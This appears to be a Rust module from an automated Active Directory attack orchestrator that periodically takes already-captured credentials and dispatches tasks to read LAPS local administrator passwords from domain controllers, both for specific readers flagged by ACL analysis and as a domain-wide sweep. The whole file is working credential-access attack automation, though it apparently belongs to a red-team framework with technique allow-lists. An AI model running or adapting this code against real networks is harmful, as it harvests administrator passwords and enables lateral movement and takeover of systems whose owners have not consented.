//! auto_laps_extraction -- explicitly read LAPS passwords from AD.
//!
//! LAPS stores local administrator passwords in the `ms-Mcs-AdmPwd` (legacy)
//! or `msLAPS-Password` (Windows LAPS) attribute. Any principal with read
//! access on the computer object can retrieve it.
//!
//! This module dispatches explicit LAPS read attempts for each credential
//! against each discovered host, complementing the low_hanging_fruit task
//! which bundles LAPS with other checks.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;

/// Dedup key prefix for LAPS extraction.
const DEDUP_LAPS: &str = "laps_extract";

/// Monitors for LAPS-readable hosts and dispatches password extraction.
/// Interval: 45s. Runs after initial credential discovery to avoid wasting
/// unauthenticated cycles.
pub async fn auto_laps_extraction(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("laps") {
            continue;
        }

        let work: Vec<LapsWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            // Two paths to LAPS:
            // 1. Vuln-driven: BloodHound/ACL analysis found explicit LAPS read access
            // 2. Domain-wide: try each credential against the DC to read LAPS for all
            //    computers (netexec ldap -M laps)

            let mut items = Vec::new();

            // Path 1: Vulnerability-driven LAPS (specific reader identified)
            for vuln in state.discovered_vulnerabilities.values() {
                let vtype = vuln.vuln_type.to_lowercase();
                if vtype != "laps_abuse" && vtype != "laps_reader" && vtype != "laps" {
                    continue;
                }
                if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                    continue;
                }

                let dedup_key = format!("{DEDUP_LAPS}:vuln:{}", vuln.vuln_id);
                if state.is_processed(DEDUP_LAPS, &dedup_key) {
                    continue;
                }

                let reader = vuln
                    .details
                    .get("source")
                    .or_else(|| vuln.details.get("account_name"))
                    .or_else(|| vuln.details.get("reader"))
                    .and_then(|v| v.as_str());

                let domain = vuln
                    .details
                    .get("domain")
                    .and_then(|v| v.as_str())
                    .unwrap_or("");

                let target_computer = vuln
                    .details
                    .get("target")
                    .or_else(|| vuln.details.get("target_computer"))
                    .and_then(|v| v.as_str())
                    .unwrap_or("");

                // Find credential for the reader
                let credential = reader
                    .and_then(|r| {
                        state.credentials.iter().find(|c| {
                            c.username.to_lowercase() == r.to_lowercase()
                                && (domain.is_empty()
                                    || c.domain.to_lowercase() == domain.to_lowercase())
                        })
                    })
                    .cloned();

                if let Some(cred) = credential {
                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    items.push(LapsWork {
                        dedup_key,
                        domain: domain.to_string(),
                        dc_ip,
                        target_computer: if target_computer.is_empty() {
                            None
                        } else {
                            Some(target_computer.to_string())
                        },
                        credential: cred,
                        vuln_id: Some(vuln.vuln_id.clone()),
                    });
                }
            }

            // Path 2: Domain-wide LAPS sweep (one per domain+credential)
            for cred in state.credentials.iter().filter(|c| {
                !c.domain.is_empty()
                    && !c.password.is_empty()
                    && !state.is_delegation_account(&c.username)
                    && !state.is_credential_quarantined(&c.username, &c.domain)
            }) {
                let dedup_key = format!(
                    "{DEDUP_LAPS}:sweep:{}:{}",
                    cred.domain.to_lowercase(),
                    cred.username.to_lowercase()
                );
                if state.is_processed(DEDUP_LAPS, &dedup_key) {
                    continue;
                }

                let dc_ip = state
                    .domain_controllers
                    .get(&cred.domain.to_lowercase())
                    .cloned();

                if dc_ip.is_some() {
                    items.push(LapsWork {
                        dedup_key,
                        domain: cred.domain.clone(),
                        dc_ip,
                        target_computer: None,
                        credential: cred.clone(),
                        vuln_id: None,
                    });
                }
            }

            // Limit to avoid spamming
            let limit = if dispatcher.config.strategy.is_comprehensive() {
                10
            } else {
                3
            };
            items.into_iter().take(limit).collect()
        };

        for item in work {
            let mut payload = json!({
                "technique": "laps_dump",
                "domain": item.domain,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            if let Some(ref dc) = item.dc_ip {
                payload["target_ip"] = json!(dc);
                payload["dc_ip"] = json!(dc);
            }
            if let Some(ref comp) = item.target_computer {
                payload["target_computer"] = json!(comp);
            }
            if let Some(ref vid) = item.vuln_id {
                payload["vuln_id"] = json!(vid);
            }

            let priority = dispatcher.effective_priority("laps");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %item.domain,
                        username = %item.credential.username,
                        target = ?item.target_computer,
                        "LAPS extraction dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_LAPS, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_LAPS, &item.dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch LAPS extraction"),
            }
        }
    }
}

struct LapsWork {
    dedup_key: String,
    domain: String,
    dc_ip: Option<String>,
    target_computer: Option<String>,
    credential: ares_core::models::Credential,
    vuln_id: Option<String>,
}
